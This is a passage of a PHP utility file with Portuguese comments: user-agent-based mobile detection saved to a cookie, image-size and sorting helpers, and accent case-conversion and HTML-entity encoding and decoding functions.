    case (in_array(strtolower(substr($user_agent,0,4)),array('1207'=>'1207','3gso'=>'3gso','4thp'=>'4thp','501i'=>'501i','502i'=>'502i','503i'=>'503i','504i'=>'504i','505i'=>'505i','506i'=>'506i','6310'=>'6310','6590'=>'6590','770s'=>'770s','802s'=>'802s','a wa'=>'a wa','acer'=>'acer','acs-'=>'acs-','airn'=>'airn','alav'=>'alav','asus'=>'asus','attw'=>'attw','au-m'=>'au-m','aur '=>'aur ','aus '=>'aus ','abac'=>'abac','acoo'=>'acoo','aiko'=>'aiko','alco'=>'alco','alca'=>'alca','amoi'=>'amoi','anex'=>'anex','anny'=>'anny','anyw'=>'anyw','aptu'=>'aptu','arch'=>'arch','argo'=>'argo','bell'=>'bell','bird'=>'bird','bw-n'=>'bw-n','bw-u'=>'bw-u','beck'=>'beck','benq'=>'benq','bilb'=>'bilb','blac'=>'blac','c55/'=>'c55/','cdm-'=>'cdm-','chtm'=>'chtm','capi'=>'capi','comp'=>'comp','cond'=>'cond','craw'=>'craw','dall'=>'dall','dbte'=>'dbte','dc-s'=>'dc-s','dica'=>'dica','ds-d'=>'ds-d','ds12'=>'ds12','dait'=>'dait','devi'=>'devi','dmob'=>'dmob','doco'=>'doco','dopo'=>'dopo','el49'=>'el49','erk0'=>'erk0','esl8'=>'esl8','ez40'=>'ez40','ez60'=>'ez60','ez70'=>'ez70','ezos'=>'ezos','ezze'=>'ezze','elai'=>'elai','emul'=>'emul','eric'=>'eric','ezwa'=>'ezwa','fake'=>'fake','fly-'=>'fly-','fly_'=>'fly_','g-mo'=>'g-mo','g1 u'=>'g1 u','g560'=>'g560','gf-5'=>'gf-5','grun'=>'grun','gene'=>'gene','go.w'=>'go.w','good'=>'good','grad'=>'grad','hcit'=>'hcit','hd-m'=>'hd-m','hd-p'=>'hd-p','hd-t'=>'hd-t','hei-'=>'hei-','hp i'=>'hp i','hpip'=>'hpip','hs-c'=>'hs-c','htc '=>'htc ','htc-'=>'htc-','htca'=>'htca','htcg'=>'htcg','htcp'=>'htcp','htcs'=>'htcs','htct'=>'htct','htc_'=>'htc_','haie'=>'haie','hita'=>'hita','huaw'=>'huaw','hutc'=>'hutc','i-20'=>'i-20','i-go'=>'i-go','i-ma'=>'i-ma','i230'=>'i230','iac'=>'iac','iac-'=>'iac-','iac/'=>'iac/','ig01'=>'ig01','im1k'=>'im1k','inno'=>'inno','iris'=>'iris','jata'=>'jata','java'=>'java','kddi'=>'kddi','kgt'=>'kgt','kgt/'=>'kgt/','kpt '=>'kpt ','kwc-'=>'kwc-','klon'=>'klon','lexi'=>'lexi','lg g'=>'lg g','lg-a'=>'lg-a','lg-b'=>'lg-b','lg-c'=>'lg-c','lg-d'=>'lg-d','lg-f'=>'lg-f','lg-g'=>'lg-g','lg-k'=>'lg-k','lg-l'=>'lg-l','lg-m'=>'lg-m','lg-o'=>'lg-o','lg-p'=>'lg-p','lg-s'=>'lg-s','lg-t'=>'lg-t','lg-u'=>'lg-u','lg-w'=>'lg-w','lg/k'=>'lg/k','lg/l'=>'lg/l','lg/u'=>'lg/u','lg50'=>'lg50','lg54'=>'lg54','lge-'=>'lge-','lge/'=>'lge/','lynx'=>'lynx','leno'=>'leno','m1-w'=>'m1-w','m3ga'=>'m3ga','m50/'=>'m50/','maui'=>'maui','mc01'=>'mc01','mc21'=>'mc21','mcca'=>'mcca','medi'=>'medi','meri'=>'meri','mio8'=>'mio8','mioa'=>'mioa','mo01'=>'mo01','mo02'=>'mo02','mode'=>'mode','modo'=>'modo','mot '=>'mot ','mot-'=>'mot-','mt50'=>'mt50','mtp1'=>'mtp1','mtv '=>'mtv ','mate'=>'mate','maxo'=>'maxo','merc'=>'merc','mits'=>'mits','mobi'=>'mobi','motv'=>'motv','mozz'=>'mozz','n100'=>'n100','n101'=>'n101','n102'=>'n102','n202'=>'n202','n203'=>'n203','n300'=>'n300','n302'=>'n302','n500'=>'n500','n502'=>'n502','n505'=>'n505','n700'=>'n700','n701'=>'n701','n710'=>'n710','nec-'=>'nec-','nem-'=>'nem-','newg'=>'newg','neon'=>'neon','netf'=>'netf','noki'=>'noki','nzph'=>'nzph','o2 x'=>'o2 x','o2-x'=>'o2-x','opwv'=>'opwv','owg1'=>'owg1','opti'=>'opti','oran'=>'oran','p800'=>'p800','pand'=>'pand','pg-1'=>'pg-1','pg-2'=>'pg-2','pg-3'=>'pg-3','pg-6'=>'pg-6','pg-8'=>'pg-8','pg-c'=>'pg-c','pg13'=>'pg13','phil'=>'phil','pn-2'=>'pn-2','pt-g'=>'pt-g','palm'=>'palm','pana'=>'pana','pire'=>'pire','pock'=>'pock','pose'=>'pose','psio'=>'psio','qa-a'=>'qa-a','qc-2'=>'qc-2','qc-3'=>'qc-3','qc-5'=>'qc-5','qc-7'=>'qc-7','qc07'=>'qc07','qc12'=>'qc12','qc21'=>'qc21','qc32'=>'qc32','qc60'=>'qc60','qci-'=>'qci-','qwap'=>'qwap','qtek'=>'qtek','r380'=>'r380','r600'=>'r600','raks'=>'raks','rim9'=>'rim9','rove'=>'rove','s55/'=>'s55/','sage'=>'sage','sams'=>'sams','sc01'=>'sc01','sch-'=>'sch-','scp-'=>'scp-','sdk/'=>'sdk/','se47'=>'se47','sec-'=>'sec-','sec0'=>'sec0','sec1'=>'sec1','semc'=>'semc','sgh-'=>'sgh-','shar'=>'shar','sie-'=>'sie-','sk-0'=>'sk-0','sl45'=>'sl45','slid'=>'slid','smb3'=>'smb3','smt5'=>'smt5','sp01'=>'sp01','sph-'=>'sph-','spv '=>'spv ','spv-'=>'spv-','sy01'=>'sy01','samm'=>'samm','sany'=>'sany','sava'=>'sava','scoo'=>'scoo','send'=>'send','siem'=>'siem','smar'=>'smar','smit'=>'smit','soft'=>'soft','sony'=>'sony','t-mo'=>'t-mo','t218'=>'t218','t250'=>'t250','t600'=>'t600','t610'=>'t610','t618'=>'t618','tcl-'=>'tcl-','tdg-'=>'tdg-','telm'=>'telm','tim-'=>'tim-','ts70'=>'ts70','tsm-'=>'tsm-','tsm3'=>'tsm3','tsm5'=>'tsm5','tx-9'=>'tx-9','tagt'=>'tagt','talk'=>'talk','teli'=>'teli','topl'=>'topl','tosh'=>'tosh','up.b'=>'up.b','upg1'=>'upg1','utst'=>'utst','v400'=>'v400','v750'=>'v750','veri'=>'veri','vk-v'=>'vk-v','vk40'=>'vk40','vk50'=>'vk50','vk52'=>'vk52','vk53'=>'vk53','vm40'=>'vm40','vx98'=>'vx98','virg'=>'virg','vite'=>'vite','voda'=>'voda','vulc'=>'vulc','w3c '=>'w3c ','w3c-'=>'w3c-','wapj'=>'wapj','wapp'=>'wapp','wapu'=>'wapu','wapm'=>'wapm','wig '=>'wig ','wapi'=>'wapi','wapr'=>'wapr','wapv'=>'wapv','wapy'=>'wapy','wapa'=>'wapa','waps'=>'waps','wapt'=>'wapt','winc'=>'winc','winw'=>'winw','wonu'=>'wonu','x700'=>'x700','xda2'=>'xda2','xdag'=>'xdag','yas-'=>'yas-','your'=>'your','zte-'=>'zte-','zeto'=>'zeto','acs-'=>'acs-','alav'=>'alav','alca'=>'alca','amoi'=>'amoi','aste'=>'aste','audi'=>'audi','avan'=>'avan','benq'=>'benq','bird'=>'bird','blac'=>'blac','blaz'=>'blaz','brew'=>'brew','brvw'=>'brvw','bumb'=>'bumb','ccwa'=>'ccwa','cell'=>'cell','cldc'=>'cldc','cmd-'=>'cmd-','dang'=>'dang','doco'=>'doco','eml2'=>'eml2','eric'=>'eric','fetc'=>'fetc','hipt'=>'hipt','http'=>'http','ibro'=>'ibro','idea'=>'idea','ikom'=>'ikom','inno'=>'inno','ipaq'=>'ipaq','jbro'=>'jbro','jemu'=>'jemu','java'=>'java','jigs'=>'jigs','kddi'=>'kddi','keji'=>'keji','kyoc'=>'kyoc','kyok'=>'kyok','leno'=>'leno','lg-c'=>'lg-c','lg-d'=>'lg-d','lg-g'=>'lg-g','lge-'=>'lge-','libw'=>'libw','m-cr'=>'m-cr','maui'=>'maui','maxo'=>'maxo','midp'=>'midp','mits'=>'mits','mmef'=>'mmef','mobi'=>'mobi','mot-'=>'mot-','moto'=>'moto','mwbp'=>'mwbp','mywa'=>'mywa','nec-'=>'nec-','newt'=>'newt','nok6'=>'nok6','noki'=>'noki','o2im'=>'o2im','opwv'=>'opwv','palm'=>'palm','pana'=>'pana','pant'=>'pant','pdxg'=>'pdxg','phil'=>'phil','play'=>'play','pluc'=>'pluc','port'=>'port','prox'=>'prox','qtek'=>'qtek','qwap'=>'qwap','rozo'=>'rozo','sage'=>'sage','sama'=>'sama','sams'=>'sams','sany'=>'sany','sch-'=>'sch-','sec-'=>'sec-','send'=>'send','seri'=>'seri','sgh-'=>'sgh-','shar'=>'shar','sie-'=>'sie-','siem'=>'siem','smal'=>'smal','smar'=>'smar','sony'=>'sony','sph-'=>'sph-','symb'=>'symb','t-mo'=>'t-mo','teli'=>'teli','tim-'=>'tim-','tosh'=>'tosh','treo'=>'treo','tsm-'=>'tsm-','upg1'=>'upg1','upsi'=>'upsi','vk-v'=>'vk-v','voda'=>'voda','vx52'=>'vx52','vx53'=>'vx53','vx60'=>'vx60','vx61'=>'vx61','vx70'=>'vx70','vx80'=>'vx80','vx81'=>'vx81','vx83'=>'vx83','vx85'=>'vx85','wap-'=>'wap-','wapa'=>'wapa','wapi'=>'wapi','wapp'=>'wapp','wapr'=>'wapr','webc'=>'webc','whit'=>'whit','winw'=>'winw','wmlb'=>'wmlb','xda-'=>'xda-',))); // check against a list of trimmed user agents to see if we find a match
      $mobile_browser = "mobile"; // set mobile browser to true
    break; // break even though it's the last statement in the switch so there's nothing to break away from but it seems better to include it than exclude it
  } // ends the switch 
	if($cookie != ""){
		//funcao que seta os kookies do siatema
		$URL_COOKIES = str_replace("www.", "", $_SERVER['HTTP_HOST']);//"redeqg.com.br";//url mestre
		$tempo = time()+60*60*24*30*12*2; 
		setcookie($cookie,$mobile_browser, $tempo,"/",$URL_COOKIES);
	}else{
		return $mobile_browser; // will return either true or false 
	}
} // ends function mobile_device_detect
if((!isset($_COOKIE["CONF_DEVICE".SYS_COOKIE_ID])) or ($_COOKIE["CONF_DEVICE".SYS_COOKIE_ID] == "")){ mobile_device_detect("CONF_DEVICE".SYS_COOKIE_ID); }//detecta e grava no cookie
//funcao de verificacao de aparelho/device que esta acessando o sistema







//mostra/retorna os dados de tamanho da imagem em pixels
//exemplo: $caminhoimagem = "pasta/imagem.jpg";
function imagem_tamanho($img,$ret='padrao'){
	//Obtém os tamanhos de ambas as imagens 
	$imagem  = getimagesize($img); 
	if($ret == "padrao"){ $var_r = $imagem[0]."px, ".$imagem[1]."px";  }
	if($ret == "array"){ $var_r = $imagem; }
	return $var_r;
}//fim //busca o tamanho da imagem em pixels





//alterna o ORDER BY
function alterna_ordem($ordem){
	if($ordem == "ASC"){ return "DESC"; }else{  return "ASC"; }
}//fim alterna_ordem




//monta a class CSS ASC e DESC do titulo da listagem de tabela e paginação onde organiza os dados
function css_ordem($campo,$campo_ativo,$ordem){
	if($ordem == "DESC"){ $or = "_desc"; }else{ $or = "_asc"; }
	if($campo == $campo_ativo){ return "sorting".$or; }else{  return "sorting"; }
}//fim //busca o nome da class css




//******************************************************************** 
// Função para retornar toda a variável em MAIÚSCULO. 
//******************************************************************** 
function maiusculo($string) // Coloca todo conteúdo da variavel em MAIUSCULO. 
{ 
	//$string = mb_strtoupper($string);
	$string = mb_strtoupper($string,'UTF-8'); 
	$string = str_replace("á","Á",$string); 
	$string = str_replace("é","É",$string); 
	$string = str_replace("í","Í",$string); 
	$string = str_replace("ó","Ó",$string); 
	$string = str_replace("ú","Ú",$string); 
	$string = str_replace("â","Â",$string); 
	$string = str_replace("ê","Ê",$string); 
	$string = str_replace("ô","Ô",$string); 
	$string = str_replace("î","Î",$string); 
	$string = str_replace("û","Û",$string); 
	$string = str_replace("ã","Ã",$string); 
	$string = str_replace("õ","Õ",$string); 
	$string = str_replace("ç","Ç",$string); 
	$string = str_replace("à","À",$string); 
	$string = str_replace("è","È",$string); 
	$string = str_replace("è","È",$string); 
	return $string; 
}//fim da função maiusculo


//******************************************************************** 
// Função para retornar toda a variável em MINÚSCULO. 
//******************************************************************** 
//function minusculo($string) // Coloca todo conteúdo da variavel em MINÚSCULO. 
function minusculo($string){
	//$string = mb_strtolower($string);
	$string = mb_strtolower($string);
	$string = str_replace("Â","â",$string);
	$string = str_replace("Á","á",$string);
	$string = str_replace("Ã","ã",$string);
	$string = str_replace("À","à",$string);
	$string = str_replace("Ê","ê",$string);
	$string = str_replace("É","é",$string);
	$string = str_replace("Î","î",$string);
	$string = str_replace("Í","í",$string);
	$string = str_replace("Ó","ó",$string);
	$string = str_replace("Õ","õ",$string);
	$string = str_replace("Ô","ô",$string);
	$string = str_replace("Ú","ú",$string);
	$string = str_replace("Û","û",$string);
	$string = str_replace("Ç","ç",$string);
	return $string;
}//fim da função minusculo



//******************************************************************** 
// Função que converte os acentos HTML para normal
//******************************************************************** 
function acentos_html($string){
	/*
	$string = str_replace("&aacute;","á",$string); 
	$string = str_replace("&eacute;","é",$string); 
	$string = str_replace("&iacute;","í",$string); 
	$string = str_replace("&oacute;","ó",$string); 
	$string = str_replace("&uacute;","ú",$string); 
	$string = str_replace("&acirc;","â",$string); 
	$string = str_replace("&ecirc;","ê",$string); 
	$string = str_replace("&ocirc;","ô",$string); 
	$string = str_replace("&icirc;","î",$string); 
	$string = str_replace("&ucirc;","û",$string); 
	$string = str_replace("&atilde;","ã",$string); 
	$string = str_replace("&otilde;","õ",$string); 
	$string = str_replace("&ccedil;","ç",$string); 
	$string = str_replace("&agrave;","à",$string); 
	$string = str_replace("&egrave;","è",$string); 

    $string = str_replace("&Acirc;","Â",$string);
    $string = str_replace("&Aacute;","Á",$string);
    $string = str_replace("&Atilde;","Ã",$string);
    $string = str_replace("&Agrave;","à",$string);
    $string = str_replace("&Ecirc;","Ê",$string);
    $string = str_replace("&Eacute;","É",$string);
    $string = str_replace("&Icirc;","Î",$string);
    $string = str_replace("&Iacute;","Í",$string);
    $string = str_replace("&Oacute;","Ó",$string);
    $string = str_replace("&Otilde;","Õ",$string);
    $string = str_replace("&Ocirc;","Ô",$string);
    $string = str_replace("&Uacute;","Ú",$string);
    $string = str_replace("&Ucirc;","Û",$string);
    $string = str_replace("&Ccedil;","Ç",$string);
	*/
	//Tabela de Acentos e Caracteres Especiais em HTML usando entities
	$string = str_replace("&Aacute;","Á",$string);
	$string = str_replace("&Egrave;","È",$string);
	$string = str_replace("&ocirc;","ô",$string);
	$string = str_replace("&Ccedil;","Ç",$string);
	$string = str_replace("&aacute;","á",$string);
	$string = str_replace("&egrave;","è",$string);
	$string = str_replace("&Ograve;","Ò",$string);
	$string = str_replace("&ccedil;","ç",$string);
	$string = str_replace("&Acirc;","Â",$string);
	$string = str_replace("&Euml;","Ë",$string);
	$string = str_replace("&ograve;","ò",$string);
	$string = str_replace("&acirc;","â",$string);
	$string = str_replace("&euml;","ë",$string);
	$string = str_replace("&Oslash;","Ø",$string);
	$string = str_replace("&Ntilde;","Ñ",$string);
	$string = str_replace("&Agrave;","À",$string);
	$string = str_replace("&ETH;","Ð",$string);
	$string = str_replace("&oslash;","ø",$string);
	$string = str_replace("&ntilde;","ñ",$string);
	$string = str_replace("&agrave;","à",$string);
	$string = str_replace("&eth;","ð",$string);
	$string = str_replace("&Otilde;","Õ",$string);
	$string = str_replace("&Aring;","Å",$string);
	$string = str_replace("&otilde;","õ",$string);
	$string = str_replace("&Yacute;","Ý",$string);
	$string = str_replace("&aring;","å",$string);
	$string = str_replace("&Iacute;","Í",$string);
	$string = str_replace("&Ouml;","Ö",$string);
	$string = str_replace("&yacute;","ý",$string);
	$string = str_replace("&Atilde;","Ã",$string);
	$string = str_replace("&iacute;","í",$string);
	$string = str_replace("&ouml;","ö",$string);
	$string = str_replace("&atilde;","ã",$string);
	$string = str_replace("&Icirc;","Î",$string);
	$string = str_replace("&quot;",'"',$string);
	$string = str_replace("&Auml;","Ä",$string);
	$string = str_replace("&icirc;","î",$string);
	$string = str_replace("&Uacute;","Ú",$string);
	$string = str_replace("&lt;","<",$string);
	$string = str_replace("&auml;","ä",$string);
	$string = str_replace("&Igrave;","Ì",$string);
	$string = str_replace("&uacute;","ú",$string);
	$string = str_replace("&gt;",">",$string);
	$string = str_replace("&AElig;","Æ",$string);
	$string = str_replace("&igrave;","ì",$string);
	$string = str_replace("&Ucirc;","Û",$string);
	$string = str_replace("&amp;","&",$string);
	$string = str_replace("&aelig;","æ",$string);
	$string = str_replace("&Iuml;","Ï",$string);
	$string = str_replace("&ucirc;","û",$string);
	$string = str_replace("&iuml;","ï",$string);
	$string = str_replace("&Ugrave;","Ù",$string);
	$string = str_replace("&reg;","®",$string);
	$string = str_replace("&Eacute;","É",$string);
	$string = str_replace("&ugrave;","ù",$string);
	$string = str_replace("&copy;","©",$string);
	$string = str_replace("&eacute;","é",$string);
	$string = str_replace("&Oacute;","Ó",$string);
	$string = str_replace("&Uuml;","Ü",$string);
	$string = str_replace("&THORN;","Þ",$string);
	$string = str_replace("&Ecirc;","Ê",$string);
	$string = str_replace("&oacute;","ó",$string);
	$string = str_replace("&uuml;","ü",$string);
	$string = str_replace("&thorn;","þ",$string);
	$string = str_replace("&ecirc;","ê",$string);
	$string = str_replace("&Ocirc;","Ô",$string);
	$string = str_replace("&szlig;","ß",$string);
	$string = str_replace("&sup1;","¹",$string);
	$string = str_replace("&sup2;","²",$string);
	$string = str_replace("&sup3;","³",$string);
	//Tabela ASCII em HTML
	$string = str_replace("&#33;","!",$string);
	$string = str_replace("&#65;","A",$string);
	$string = str_replace("&#97;","a",$string);
	$string = str_replace("&#163;","£",$string);
	$string = str_replace("&#195;","Ã",$string);
	$string = str_replace("&#227;","ã",$string);
	$string = str_replace("&#34;",'"',$string);
	$string = str_replace("&#66;","B",$string);
	$string = str_replace("&#98;","b",$string);
	$string = str_replace("&#164;","¤",$string);
	$string = str_replace("&#196;","Ä",$string);
	$string = str_replace("&#228;","ä",$string);
	$string = str_replace("&#35;","#",$string);
	$string = str_replace("&#67;","C",$string);
	$string = str_replace("&#99;","c",$string);
	$string = str_replace("&#165;","¥",$string);
	$string = str_replace("&#197;","Å",$string);
	$string = str_replace("&#229;","å",$string);
	$string = str_replace("&#36;","$",$string);
	$string = str_replace("&#68;","D",$string);
	$string = str_replace("&#100;","d",$string);
	$string = str_replace("&#166;","¦",$string);
	$string = str_replace("&#198;","Æ",$string);
	$string = str_replace("&#230;","æ",$string);
	$string = str_replace("&#37;","%",$string);
	$string = str_replace("&#69;","E",$string);
	$string = str_replace("&#101;","e",$string);
	$string = str_replace("&#167;","§",$string);
	$string = str_replace("&#199;","Ç",$string);
	$string = str_replace("&#231;","ç",$string);
	$string = str_replace("&#38;","&",$string);
	$string = str_replace("&#70;","F",$string);
	$string = str_replace("&#102;","f",$string);
	$string = str_replace("&#168;","¨",$string);
	$string = str_replace("&#200;","È",$string);
	$string = str_replace("&#232;","è",$string);
	$string = str_replace("&#39;","'",$string);
	$string = str_replace("&#71;","G",$string);
	$string = str_replace("&#103;","g",$string);
	$string = str_replace("&#169;","©",$string);
	$string = str_replace("&#201;","É",$string);
	$string = str_replace("&#233;","é",$string);
	$string = str_replace("&#40;","(",$string);
	$string = str_replace("&#72;","H",$string);
	$string = str_replace("&#104;","h",$string);
	$string = str_replace("&#170;","ª",$string);
	$string = str_replace("&#202;","Ê",$string);
	$string = str_replace("&#234;","ê",$string);
	$string = str_replace("&#41;",")",$string);
	$string = str_replace("&#73;","I",$string);
	$string = str_replace("&#105;","i",$string);
	$string = str_replace("&#171;","«",$string);
	$string = str_replace("&#203;","Ë",$string);
	$string = str_replace("&#235;","ë",$string);
	$string = str_replace("&#42;","*",$string);
	$string = str_replace("&#74;","J",$string);
	$string = str_replace("&#106;","j",$string);
	$string = str_replace("&#172;","¬",$string);
	$string = str_replace("&#204;","Ì",$string);
	$string = str_replace("&#236;","ì",$string);
	$string = str_replace("&#43;","+",$string);
	$string = str_replace("&#75;","K",$string);
	$string = str_replace("&#107;","k",$string);
	$string = str_replace("&#173;","­",$string);
	$string = str_replace("&#205;","Í",$string);
	$string = str_replace("&#237;","í",$string);
	$string = str_replace("&#44;",",",$string);
	$string = str_replace("&#76;","L",$string);
	$string = str_replace("&#108;","l",$string);
	$string = str_replace("&#174;","®",$string);
	$string = str_replace("&#206;","Î",$string);
	$string = str_replace("&#238;","î",$string);
	$string = str_replace("&#45;","-",$string);
	$string = str_replace("&#77;","M",$string);
	$string = str_replace("&#109;","m",$string);
	$string = str_replace("&#175;","¯",$string);
	$string = str_replace("&#207;","Ï",$string);
	$string = str_replace("&#239;","ï",$string);
	$string = str_replace("&#46;",".",$string);
	$string = str_replace("&#78;","N",$string);
	$string = str_replace("&#110;","n",$string);
	$string = str_replace("&#176;","°",$string);
	$string = str_replace("&#208;","Ð",$string);
	$string = str_replace("&#240;","ð",$string);
	$string = str_replace("&#47;","/",$string);
	$string = str_replace("&#79;","O",$string);
	$string = str_replace("&#111;","o",$string);
	$string = str_replace("&#177;","±",$string);
	$string = str_replace("&#209;","Ñ",$string);
	$string = str_replace("&#241;","ñ",$string);
	$string = str_replace("&#48;","0",$string);
	$string = str_replace("&#80;","P",$string);
	$string = str_replace("&#112;","p",$string);
	$string = str_replace("&#178;","²",$string);
	$string = str_replace("&#210;","Ò",$string);
	$string = str_replace("&#242;","ò",$string);
	$string = str_replace("&#49;","1",$string);
	$string = str_replace("&#81;","Q",$string);
	$string = str_replace("&#113;","q",$string);
	$string = str_replace("&#179;","³",$string);
	$string = str_replace("&#211;","Ó",$string);
	$string = str_replace("&#243;","ó",$string);
	$string = str_replace("&#50;","2",$string);
	$string = str_replace("&#82;","R",$string);
	$string = str_replace("&#114;","r",$string);
	$string = str_replace("&#180;","´",$string);
	$string = str_replace("&#212;","Ô",$string);
	$string = str_replace("&#244;","ô",$string);
	$string = str_replace("&#51;","3",$string);
	$string = str_replace("&#83;","S",$string);
	$string = str_replace("&#115;","s",$string);
	$string = str_replace("&#181;","µ",$string);
	$string = str_replace("&#213;","Õ",$string);
	$string = str_replace("&#245;","õ",$string);
	$string = str_replace("&#52;","4",$string);
	$string = str_replace("&#84;","T",$string);
	$string = str_replace("&#116;","t",$string);
	$string = str_replace("&#182;","¶",$string);
	$string = str_replace("&#214;","Ö",$string);
	$string = str_replace("&#246;","ö",$string);
	$string = str_replace("&#53;","5",$string);
	$string = str_replace("&#85;","U",$string);
	$string = str_replace("&#117;","u",$string);
	$string = str_replace("&#183;","·",$string);
	$string = str_replace("&#215;","×",$string);
	$string = str_replace("&#247;","÷",$string);
	$string = str_replace("&#54;","6",$string);
	$string = str_replace("&#86;","V",$string);
	$string = str_replace("&#118;","v",$string);
	$string = str_replace("&#184;","¸",$string);
	$string = str_replace("&#216;","Ø",$string);
	$string = str_replace("&#248;","ø",$string);
	$string = str_replace("&#55;","7",$string);
	$string = str_replace("&#87;","W",$string);
	$string = str_replace("&#119;","w",$string);
	$string = str_replace("&#185;","¹",$string);
	$string = str_replace("&#217;","Ù",$string);
	$string = str_replace("&#249;","ù",$string);
	$string = str_replace("&#56;","8",$string);
	$string = str_replace("&#88;","X",$string);
	$string = str_replace("&#120;","x",$string);
	$string = str_replace("&#186;","º",$string);
	$string = str_replace("&#218;","Ú",$string);
	$string = str_replace("&#250;","ú",$string);
	$string = str_replace("&#57;","9",$string);
	$string = str_replace("&#89;","Y",$string);
	$string = str_replace("&#121;","y",$string);
	$string = str_replace("&#187;","»",$string);
	$string = str_replace("&#219;","Û",$string);
	$string = str_replace("&#251;","û",$string);
	$string = str_replace("&#58;",":",$string);
	$string = str_replace("&#90;","Z",$string);
	$string = str_replace("&#122;","z",$string);
	$string = str_replace("&#188;","¼",$string);
	$string = str_replace("&#220;","Ü",$string);
	$string = str_replace("&#252;","ü",$string);
	$string = str_replace("&#59;",";",$string);
	$string = str_replace("&#91;","[",$string);
	$string = str_replace("&#123;","{",$string);
	$string = str_replace("&#189;","½",$string);
	$string = str_replace("&#221;","Ý",$string);
	$string = str_replace("&#253;","ý",$string);
	$string = str_replace("&#60;","<",$string);
	$string = str_replace("&#92;","\\",$string);
	$string = str_replace("&#124;","|",$string);
	$string = str_replace("&#190;","¾",$string);
	$string = str_replace("&#222;","Þ",$string);
	$string = str_replace("&#254;","þ",$string);
	$string = str_replace("&#61;","=",$string);
	$string = str_replace("&#93;","]",$string);
	$string = str_replace("&#125;","}",$string);
	$string = str_replace("&#191;","¿",$string);
	$string = str_replace("&#223;","ß",$string);
	$string = str_replace("&#255;","ÿ",$string);
	$string = str_replace("&#62;",">",$string);
	$string = str_replace("&#94;","^",$string);
	$string = str_replace("&#126;","~",$string);
	$string = str_replace("&#192;","À",$string);
	$string = str_replace("&#224;","à",$string);
	$string = str_replace("&#256;","A",$string);
	$string = str_replace("&#63;","?",$string);
	$string = str_replace("&#95;","_",$string);
	$string = str_replace("&#161;","¡",$string);
	$string = str_replace("&#193;","Á",$string);
	$string = str_replace("&#225;","á",$string);
	$string = str_replace("&#64;","@",$string);
	$string = str_replace("&#96;","`",$string);
	$string = str_replace("&#162;","¢",$string);
	$string = str_replace("&#194;","Â",$string);
	$string = str_replace("&#226;","â",$string);
    return ($string);
}//fim da função acentos_html




/*
Função que converte acentos para ISO
*/
function acentos_ISO($string){
	//Tabela de Acentos e Caracteres Especiais em HTML usando entities
	$string = str_replace("Á","&Aacute;",$string);
	$string = str_replace("È","&Egrave;",$string);
	$string = str_replace("ô","&ocirc;",$string);
	$string = str_replace("Ç","&Ccedil;",$string);
	$string = str_replace("á","&aacute;",$string);
	$string = str_replace("è","&egrave;",$string);
	$string = str_replace("Ò","&Ograve;",$string);
	$string = str_replace("ç","&ccedil;",$string);
	$string = str_replace("Â","&Acirc;",$string);
	$string = str_replace("Ë","&Euml;",$string);
	$string = str_replace("ò","&ograve;",$string);
	$string = str_replace("â","&acirc;",$string);
	$string = str_replace("ë","&euml;",$string);
	$string = str_replace("Ø","&Oslash;",$string);
	$string = str_replace("Ñ","&Ntilde;",$string);
	$string = str_replace("À","&Agrave;",$string);
	$string = str_replace("Ð","&ETH;",$string);
	$string = str_replace("ø","&oslash;",$string);
	$string = str_replace("ñ","&ntilde;",$string);
	$string = str_replace("à","&agrave;",$string);
	$string = str_replace("ð","&eth;",$string);
	$string = str_replace("Õ","&Otilde;",$string);
	$string = str_replace("Å","&Aring;",$string);
	$string = str_replace("õ","&otilde;",$string);
	$string = str_replace("Ý","&Yacute;",$string);
	$string = str_replace("å","&aring;",$string);
	$string = str_replace("Í","&Iacute;",$string);
	$string = str_replace("Ö","&Ouml;",$string);
	$string = str_replace("ý","&yacute;",$string);
	$string = str_replace("Ã","&Atilde;",$string);
	$string = str_replace("í","&iacute;",$string);
	$string = str_replace("ö","&ouml;",$string);
	$string = str_replace("ã","&atilde;",$string);
	$string = str_replace("Î","&Icirc;",$string);
	$string = str_replace('"',"&quot;",$string);
	$string = str_replace("Ä","&Auml;",$string);
	$string = str_replace("î","&icirc;",$string);
	$string = str_replace("Ú","&Uacute;",$string);
	$string = str_replace("<","&lt;",$string);
	$string = str_replace("ä","&auml;",$string);
	$string = str_replace("Ì","&Igrave;",$string);
	$string = str_replace("ú","&uacute;",$string);
	$string = str_replace(">","&gt;",$string);
	$string = str_replace("Æ","&AElig;",$string);
	$string = str_replace("ì","&igrave;",$string);
	$string = str_replace("Û","&Ucirc;",$string);
	$string = str_replace("&","&amp;",$string);
	$string = str_replace("æ","&aelig;",$string);
	$string = str_replace("Ï","&Iuml;",$string);
	$string = str_replace("û","&ucirc;",$string);
	$string = str_replace("ï","&iuml;",$string);
	$string = str_replace("Ù","&Ugrave;",$string);
	$string = str_replace("®","&reg;",$string);
	$string = str_replace("É","&Eacute;",$string);
	$string = str_replace("ù","&ugrave;",$string);
	$string = str_replace("©","&copy;",$string);
	$string = str_replace("é","&eacute;",$string);
	$string = str_replace("Ó","&Oacute;",$string);
	$string = str_replace("Ü","&Uuml;",$string);
	$string = str_replace("Þ","&THORN;",$string);
	$string = str_replace("Ê","&Ecirc;",$string);
	$string = str_replace("ó","&oacute;",$string);
	$string = str_replace("ü","&uuml;",$string);
	$string = str_replace("þ","&thorn;",$string);
	$string = str_replace("ê","&ecirc;",$string);
	$string = str_replace("Ô","&Ocirc;",$string);
	$string = str_replace("ß","&szlig;",$string);
	$string = str_replace("¹","&sup1;",$string);
	$string = str_replace("²","&sup2;",$string);
	$string = str_replace("³","&sup3;",$string);
	return $string;
}//fim função de converter acentos ISO

 

//Converte para maiúsculas o primeiro caractere de cada palavra fora os artigos listados abaixo.
function sentenca($string){
	/*if($nome != ""){//MODO ANTIGO
		if($utf8 == "1"){ $nome = utf8_decode($nome); }
		$nome = trim($nome);
		// primeiro torna tudo minusculo cuidando das acentuadas
		for($char=0; $char<=strlen($nome); $char++){
			// se for letra maiscula acentuada transforma em minuscula acentuada
			if((ord($nome[$char]) >= 192) && (ord($nome[$char]) <= 223))
			$nome[$char] = chr(ord($nome[$char]) + 32);
		}
		// porque a funcao strtolower nao pega letras acentuadas
		$nome = str_replace("  "," ",$nome);
		$nome = str_replace("  "," ",$nome);
		$nome = str_replace("  "," ",$nome);
		$nome = explode(" ", strtolower($nome));
		foreach ($nome as &$valor){
			// faz a primeira maiscula excluindo as palavras que ligam dois nomes
			if(($valor != "da") && ($valor != "das") && ($valor != "de") && ($valor != "do") && ($valor != "dos") && ($valor != "e") && ($valor != "é")){
				$valor[0] = strtoupper($valor[0]);
				// coloca ponto de abreviacao quando a letra vier sozinha, excluindo a letra 'e' que liga dois nomes
